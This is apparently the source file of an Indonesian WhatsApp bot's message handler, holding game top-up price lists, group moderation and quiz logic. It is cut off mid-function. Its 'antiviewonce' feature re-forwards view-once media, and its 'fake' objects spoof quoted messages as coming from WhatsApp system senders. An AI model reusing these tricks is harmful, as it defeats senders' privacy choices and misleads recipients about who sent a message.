/*
JNGN DIHPS CREATORNYA!
CREATOR : AULIA RAHMAN
JNGN DIHPS CREATORNYA!
DONASI LAH BIAR ADMIN UP LAGI!
DANA : 081528965381
OVO : 085821676621
PULSA : 081528965381
SELAIN NO DIBAWAH INI CLONE YA!
NOMOR WA OWNER : 085821676621
SELAIN NO ITU CLONE YA!


Thanks For To :
• Allah Swt
• Ortu
• Aulia Rahman
• Lexxy Official
• ZeroYt7
• Dan Pengguna Bot!
Note : Thanks To nya jgn Di hps Ya Tod
*/
require('../options/config')
var { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
var fs = require('fs')
var util = require('util')
var chalk = require('chalk')
var { exec, spawn, execSync } = require("child_process")
var axios = require('axios')
var path = require('path')
var os = require('os')
var qrcode = require('qrcode')
var moment = require('moment-timezone')
var { JSDOM } = require('jsdom')
var speed = require('performance-now')
var FormData = require("form-data")
var { performance } = require('perf_hooks')
var { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, makeid } = require('../message/myfunc')
var { pinterest, wallpaper, wikimedia, quotesAnime } = require('../message/scraper')
var { jadibot, listJadibot } = require('../message/jadibot')
//var premium = require('../message/premium') //Fix aja kalau bisa
var { convertSaldo } = require('../message/dana')
var { csrfGenerator, listProduct, isProductValid, getDetailProduct, getQrCode, convertGopay } = require("../message/gopay")
var { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../message/respon-list')
var { addRespons, checkRespons, deleteRespons } = require('../message/respon')

// HOST WHM
let hostwhm = '' //Host server whm
let usrwhm = '' //username whm
let passwhm = '' //Password whm
let tokenwhm = '' // caranya => https://www.eukhost.com/kb/how-to-generate-an-api-token-using-whm/
let ipsrv = '' //ip server whm

// Biarin Jgn Di ubah
let authWhm = {headers: {Authorization: `WHM ${usrwhm}:${tokenwhm}`}}


// List Dm Ff
let list = {
  "ff": {
    "FF5": {
    "nama": "5 Diamond",
    "hargaid": 900,
    "harga":"Rp900",
    },
        "FF10": {
    "nama": "10 Diamond",
    "hargaid": 1800,
    "harga":"Rp1.800",
    },
        "FF15": {
    "nama": "15 Diamond",
    "hargaid": 2700,
    "harga":"Rp2.700",
    },
        "FF20": {
    "nama": "20 Diamond",
    "hargaid": 3000,
    "harga":"Rp3.000",
    },
        "FF25": {
    "nama": "25 Diamond",
    "hargaid": 3900,
    "harga":"Rp3.900",
    },
        "FF30": {
    "nama": "30 Diamond",
    "hargaid": 4800,
    "harga":"Rp4.800",
    },
        "FF40": {
    "nama": "40 Diamond",
    "hargaid": 6000,
    "harga":"Rp6.000",
    },
        "FF50": {
    "nama": "50 Diamond",
    "hargaid": 7200,
    "harga":"Rp7.200",
    },
        "FF55": {
    "nama": "55 Diamond",
    "hargaid": 8100,
    "harga":"Rp8.100",
    },
        "FF60": {
    "nama": "60 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
        "FF70": {
    "nama": "70 Diamond",
    "hargaid": 9900,
    "harga":"Rp9.900",
    },
        "FF75": {
    "nama": "75 Diamond",
    "hargaid": 10800,
    "harga":"Rp10.800",
    },
"FF80": {
"nama": "80 Diamond",	
"hargaid":11700,
"harga":"Rp11.700",
},
"FF90": {
"nama": "90 Diamond",	
"hargaid":12900,
"harga":"Rp12.900",
},
"FF95": {
"nama": "95 Diamond",	
"hargaid":13800,
"harga":"Rp13.800",	
},
"FF100": {
"nama": "100 Diamond",	
"hargaid": 14400,
"harga":"Rp14.400",
},
"FF120": {
"nama": "120 Diamond",	
"hargaid":17100,
"harga":"Rp17.100",
},
"FF130": {
"nama": "130 Diamond",	
"hargaid":18900,
"harga":"Rp18.900",
},
"FF140": {
"nama": "140 Diamond",	
"hargaid":19800,
"harga":"Rp19.800",	
},
"FF145": {
"nama": "145 Diamond",	
"hargaid":20700,
"harga":"Rp20.700",
},
"FF150": {
"nama": "150 Diamond",	
"hargaid":21600,
"harga":"Rp21.600",
},
"FF160": {
"nama": "160 Diamond",	
"hargaid":22800,
"harga":"Rp22.800",
},
"FF180": {
"nama": "180 Diamond",	
"hargaid":25800,
"harga":"Rp25.800",
},
"FF190": {
"nama": "190 Diamond",	
"hargaid":27000,
"harga":"Rp27.000",
},
"FF200": {
"nama": "200 Diamond",	
"hargaid":28800,
"harga":"Rp28.800",
},
"FF210": {
"nama": "210 Diamond",	
"hargaid":29700,
"harga":"Rp29.700",
},
"FFM": {
"nama": "Member Mingguan",
"hargaid":30000,
"harga":"Rp30.000",
},
"FF250": {
"nama": "250 Diamond",	
"hargaid":35700,
"harga":"Rp35.700",
},
"FF280": {
"nama": "280 Diamond",	
"hargaid":39600,
"harga":"Rp39.600",
},
"FF300": {
"nama": "300 Diamond",	
"hargaid":42600,
"harga":"Rp42.600",
},
"FF355": {
"nama": "355 Diamond",	
"hargaid":49900,
"harga":"Rp49.900",
},
"FF350": {
"nama": "350 Diamond",	
"hargaid":49500,
"harga":"Rp49.500",
},
"FF375": {
"nama": "375 Diamond",	
"hargaid":52500,
"harga":"Rp52.500",
},
"FF400": {
"nama": "400 Diamond",	
"hargaid":56400,
"harga":"Rp56.400",
},
"FF405": {
"nama": "405 Diamond",	
"hargaid":56700,
"harga":"Rp56.700",
},
"FF425": {
"nama": "425 Diamond",	
"hargaid":59400,
"harga":"Rp59.400",
},
"FF475": {
"nama": "475 Diamond",	
"hargaid":66600,
"harga":"Rp66.600",
},
"FF500": {
"nama": "500 Diamond",	
"hargaid":70200,
"harga":"Rp70.200",
},
"FF510": {
"nama": "510 Diamond",	
"hargaid": 72000,
"harga":"Rp72.000",
},
"FF515": {
"nama": "515 Diamond",	
"hargaid": 72300,
"harga":"Rp72.300",
},

"FF512": {
"nama": "512+3 Diamond",	
"hargaid":72300,
"harga":"Rp72.300",
},
"FF545": {
"nama": "545 Diamond",	
"hargaid":76500,
"harga":"Rp76.500",
},
"FF565": {
"nama": "565 Diamond",	
"hargaid":79200,
"harga":"Rp79.200",	
},
"FF600": {
"nama": "600 Diamond",	
"hargaid":84600,
"harga":"Rp84.600",
},
"FF635": {
"nama": "635 Diamond",	
"hargaid": 89100,
"harga":"Rp89.100",
},
"FF645": {
"nama": "645 Diamond",	
"hargaid":90900,
"harga":"Rp90.900",
},
"FF655": {
"nama": "655 Diamond",	
"hargaid":92100,
"harga":"Rp92.100",
},
"FF720": {
"nama": "720 Diamond",	
"hargaid": 99000,
"harga":"Rp99.000",
},
"FF700": {
"nama": "700 Diamond",	
"hargaid":99000,
"harga":"Rp99.000",
},
"FF770": {
"nama": "770 Diamond",	
"hargaid":106200,
"harga":"Rp106.200",	
},
"FF790": {
"nama": "790 Diamond",	
"hargaid": 108900,
"harga":"Rp108.900",
},
"FF800": {
"nama": "800 Diamond",	
"hargaid": 110700,
"harga":"Rp110.700",
},
"FF860": {
"nama": "860 Diamond",	
"hargaid": 118800,
"harga":"Rp118.800",
},
"FF930": {
"nama": "930 Diamond",	
"hargaid":128700,
"harga":"Rp128.700",
},
"FF1000": {
"nama": "1000 Diamond",	
"hargaid":138600,
"harga":"Rp138.600",	
},
"FF1050": {
"nama": "1050 Diamond",	
"hargaid":145800,
"harga":"Rp145.800",
},
"FF1075": {
"nama": "1075 Diamond",	
"hargaid":148500,
"harga":"Rp148.500",
},
"FF1080": {
"nama": "1080 Diamond",	
"hargaid":149400,
"harga":"Rp149.400",
},
"FFB": {
"nama": "Member Bulanan",
"hargaid":150000,
"harga":"Rp150.000",
},
"FF1200": {
"nama": "1200 Diamond",	
"hargaid":166800,
"harga":"Rp166.800",
},
"FF1215": {
"nama": "1215 Diamond",	
"hargaid":16830,
"harga":"Rp168.300",
},
"FF1300": {
"nama": "1300 Diamond",	
"hargaid":180900,
"harga":"Rp180.900",
},
"FF1440": {
"nama": "1440 Diamond",	
"hargaid":198000,
"harga":"Rp198.000",
},
"FF1450": {
"nama": "1450 Diamond",	
"hargaid":199800,
"harga":"Rp199.800",
},
"FF1490": {
"nama": "1490 Diamond",	
"hargaid":205200,
"harga":"Rp205.200",
},
"FF1510": {
"nama": "1510 Diamond",	
"hargaid":207900,
"harga":"Rp207.900",
},
"FF1580": {
"nama": "1580 Diamond",	
"hargaid":217800,
"harga":"Rp217.800",
},
"FF1795": {
"nama": "1795 Diamond",	
"hargaid":247500,
"harga":"Rp247.500",
},
"FF1800": {
"nama": "1800, Diamond",	
"hargaid": 248400,
"harga":"Rp248.400",
},
"FF2000": {
"nama": "2000 Diamond",	
"hargaid":270000,
"harga":"Rp270.000",
},
"FF2140": {
"nama": "2140 Diamond",	
"hargaid": 289800,
"harga":"Rp289.800",
},
"FF2190": {
"nama": "2190 Diamond",	
"hargaid": 297000,
"harga":"Rp297.000",
},
"FF2210": {
"nama": "2210 Diamond",	
"hargaid": 299700,
"harga":"Rp299.700",
},
"FF2280": {
"nama": "2280 Diamond",	
"hargaid": 309600,
"harga":"Rp309.600",
},
"FF2355": {
"nama": "2355 Diamond",	
"hargaid": 319500,
"harga":"Rp319.500",
},
"FF2720": {
"nama": "2720 Diamond",	
"hargaid": 369000,
"harga":"Rp369.000",
},
"FF4000": {
"nama": "4000 Diamond",	
"hargaid": 540000,
"harga":"Rp540.000",
},
"FF77290": {
"nama": "7290 Diamond",	
"hargaid": 990000,
"harga":"Rp990.000",
},
},
};

// List Dm Ml
let listml = {
  "ml": {
    "UPMBL5": {
    "nama": "5 Diamond",
    "hargaid": 1700,
    "harga":"Rp1.700",
    },
        "UPMBL12": {
    "nama": "12 Diamond",
    "hargaid": 4000,
    "harga":"Rp4.000",
    },
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "UPMBL19": {
    "nama": "19 Diamond",
    "hargaid": 7000,
    "harga":"Rp7.000",
    },
        "UPMBL28": {
    "nama": "28 Diamond",
    "hargaid": 10500,
    "harga":"Rp10.500",
    },
        "UPMBL36": {
    "nama": "36 Diamond",
    "hargaid": 13000,
    "harga":"Rp13.000",
    },
        "UPMBL44": {
    "nama": "44 Diamond",
    "hargaid": 15000,
    "harga":"Rp15.000",
    },
        "UPMBL59": {
    "nama": "59 Diamond",
    "hargaid": 18500,
    "harga":"Rp18.500",
    },
        "UPMBL74": {
    "nama": "74 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "UPMBL85": {
    "nama": "85 Diamond",
    "hargaid": 26500,
    "harga":"Rp26.500",
    },
        "UPMBL170": {
    "nama": "170 Diamond",
    "hargaid": 51500,
    "harga":"Rp51.500",
    },
        "UPMBL185": {
    "nama": "185 Diamond",
    "hargaid": 56500,
    "harga":"Rp56.500",
    },
        "UPMBL222": {
    "nama": "222 Diamond",
    "hargaid": 67500,
    "harga":"Rp67.500",
    },
        "UPMBL240": {
    "nama": "240 Diamond",
    "hargaid": 72500,
    "harga":"Rp72.500",
    },
        "UPMBL296": {
    "nama": "296 Diamond",
    "hargaid": 89500,
    "harga":"Rp89.500",
    },
        "UPMBL370": {
    "nama": "370 Diamond",
    "hargaid": 111500,
    "harga":"Rp111.500",
    },
        "UPMBL408": {
    "nama": "408 Diamond",
    "hargaid": 123500,
    "harga":"Rp123.500",
    },
        "UPMBL568": {
    "nama": "568 Diamond",
    "hargaid": 167500,
    "harga":"Rp167.500",
    },
        "UPMBL875": {
    "nama": "875 Diamond",
    "hargaid": 256500,
    "harga":"Rp256.500",
    },
        "UPMBL1159": {
    "nama": "1159 Diamond",
    "hargaid": 333500,
    "harga":"Rp333.500",
    },
        "UPMBL2010": {
    "nama": "2010 Diamond",
    "hargaid": 555.500,
    "harga":"Rp555.500",
    },
        "UPMBL4830": {
    "nama": "4830 Diamond",
    "hargaid": 1322500,
    "harga":"Rp1322.500",
    },
 },
};

// List Dm Mlbb
let listmlbb = {
  "ml": {
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "ZIDMBL34": {
    "nama": "34 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
    "ZIDMBL50": {
    "nama": "50 Diamond",
    "hargaid": 13500,
    "harga":"Rp13.500",
    },
        "ZIDMBL66": {
    "nama": "66 Diamond",
    "hargaid": 18000,
    "harga":"Rp18.000",
    },
        "ZIDMBL74": {
    "nama": "74 Diamond",
    "hargaid": 20000,
    "harga":"Rp20.000",
    },
        "ZIDMBL83": {
    "nama": "83 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "ZIDMBL184": {
    "nama": "184 Diamond",
    "hargaid": 5000,
    "harga":"Rp50.000",
    },
        "ZIDMBL366": {
    "nama": "366 Diamond",
    "hargaid": 100000,
    "harga":"Rp100.000",
    },
        "ZIDMBL758": {
    "nama": "758 Diamond",
    "hargaid": 200000,
    "harga":"Rp200.000",
    },
 },
}
//---------------------------[ Waktu Asia & Time ]--------------------------------//

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')

//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

var tebaklagu = db.data.game.tebaklagu = []
var _family100 = db.data.game.family100 = []
var kuismath = db.data.game.math = []
var tebakgambar = db.data.game.tebakgambar = []
var tebakkata = db.data.game.tebakkata = []
var caklontong = db.data.game.lontong = []
var caklontong_desk = db.data.game.lontong_desk = []
var tebakkalimat = db.data.game.kalimat = []
var tebaklirik = db.data.game.lirik = []
var tebaktebakan = db.data.game.tebakan = []
var vote = db.data.others.vote = []
var menfes = db.data.others.menfes = []
const db_user = db.data.others.user = []

//let _premium = JSON.parse(fs.readFileSync('./json/premium.json')) // Fix Aja
let db_respon_list = JSON.parse(fs.readFileSync('./json/list-message.json'))

//━━━━━━━━━━━━━━━[ MODULE EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = liaacans = async (liaacans, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var pushname = m.pushName || "No Name"
var botNumber = await liaacans.decodeJid(liaacans.user.id)
var isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
var itsMe = m.sender == botNumber ? true : false
var text = q = args.join(" ")
var quoted = m.quoted ? m.quoted : m
var mime = (quoted.msg || quoted).mimetype || ''
var isMedia = /image|video|sticker|audio/.test(mime)
var groupMetadata = m.isGroup ? await liaacans.groupMetadata(m.chat).catch(e => {}) : ''
var groupName = m.isGroup ? groupMetadata.subject : ''
var participants = m.isGroup ? await groupMetadata.participants : ''
var groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
var groupOwner = m.isGroup ? groupMetadata.owner : ''
 var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
//var isPremium = isCreator ? true : premium.checkPremiumUser(m.sender, _premium) //Fix Aja Klau Bisa

	
//━━━━━━━━━━━━━━━[ FUNCTION ]━━━━━━━━━━━━━━━━━//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}

    
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
if (!('antiwame' in chats)) chats.antiwame = false
if (!('antiviewonce' in chats)) chats.antiviewonce = false
if (!('antilinkig' in chats)) chats.antilinkig = false
} else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
antilinkig: false,
antiwame: false,
antiviewonce: false
}



var creator = `©Created By : ${global.creator}`

var footer = `Note : Jangan Spam Bot!! Jika Tidak Ingin Diblokir Bot\nQuotes : ${global.quotes}`
		
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = true
if (!('autotyping' in setting)) setting.autotyping = true
} else global.db.data.settings[botNumber] = {
status: 0,
autobio: true,
autotyping: true,
}
	    
} catch (err) {
console.error(err)
}

	   
//━━━━━━━━━━━━━━━[ PUBLIC & SELF ]━━━━━━━━━━━━━━━━━//

// Public & Self
        if (!liaacans.public) {
            if (!m.key.fromMe) return
        }

//━━━━━━━━━━━━━━━[ RESET LIMIT ]━━━━━━━━━━━━━━━━━//

let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
        
//━━━━━━━━━━━━━━━[ AUTO SET BIO && TYPING ]━━━━━━━━━━━━━━━━━//

if (db.data.settings[botNumber].autobio) {
let setting = global.db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await liaacans.setStatus(`${liaacans.user.name} | Runtime : ${runtime(process.uptime())}`)
setting.status = new Date() * 1
}
}

if (db.data.settings[botNumber].autotyping) { 
if (m.chat) { 
   liaacans.sendPresenceUpdate('composing', m.chat) 
}
}

//━━━━━━━━━━━━━━━[ Waktu Asia & Auto Read ]━━━━━━━━━━━━━━━━━//

const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

if (m.message) {
            liaacans.readMessages([m.key])
        }

//━━━━━━━━━━━━━━━[ FUNCTION GROUP ]━━━━━━━━━━━━━━━━━//

if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
let gclink = (`https://chat.whatsapp.com/`+await liaacans.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
await sleep(1000) // waktu kick 10 detik saja kalau mau ubah, ubah aja
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (db.data.chats[m.chat].antilinkig) {
if (budy.match(`instagram.com`)) {
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI LINK INSTA 」\n\nKamu terdeteksi mengirim link instagram, maaf kamu akan di kick !`)
await sleep(1000) // waktu kick 10 detik saja kalau mau ubah, ubah aja
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (db.data.chats[m.chat].antiwame) {
if (budy.match(`wa.me`)) {
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`「 ANTI WAME 」\n\nKamu terdeteksi mengirim link wame, maaf kamu akan di kick !`)
await sleep(1000) // waktu kick 10 detik saja kalau mau ubah, ubah aja
liaacans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (db.data.chats[m.chat].antiviewonce) {
		if (m.isGroup && m.mtype == 'viewOnceMessage') {
			let teks = `「 *Anti ViewOnce Message* 」
    
    🤠 *Name* : ${pushname}
    👾 *User* : @${m.sender.split("@")[0]}
    ⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
    
    💫 *MessageType* : ${m.mtype}`
     m.reply(teks)
			await sleep(500)
			m.copyNForward(m.chat, true, {
				readViewOnce: true
			}, {
				quoted: mek
			}).catch(_ => m.reply('Mungkin dah pernah dibuka bot'))
		}
}


        
//━━━━━━━━━━━━━━━[ MUTE ]━━━━━━━━━━━━━━━━━//

if (db.data.chats[m.chat].mute && !isCreator) {
return
}

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, jpegThumbnail: global.thumb, surface: 200, message: '©Created By LiaaCans BOT', orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: '©LiaaCans',jpegThumbnail: global.thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": global.fake, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': global.fake, 'jpegThumbnail': global.thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "YT Aulia Rahman Official", "caption": global.fake, 'jpegThumbnail': global.thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title": global.fake, "h": `Hmm`,'seconds': '359996400', 'caption': global.fake, 'jpegThumbnail': global.thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: global.fake ,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'jpegThumbnail': global.thumb, jpegThumbnail: global.thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": global.fake,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./image/image.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const ftrolii = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": global.fake,
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6285714170944@s.whatsapp.net"
}}}}
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": global.fake,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
const freply = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": global.fake, 
"jpegThumbnail": thumb
}
}
}
const kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
//━━━━━━━━━━━━━━━[ RESPON CMD ]━━━━━━━━━━━━━━━━━//

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: liaacans.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, liaacans.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
liaacans.ev.emit('messages.upsert', msg)
}

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
	    
if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
liaacans.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaklagu[m.sender.split('@')[0]]
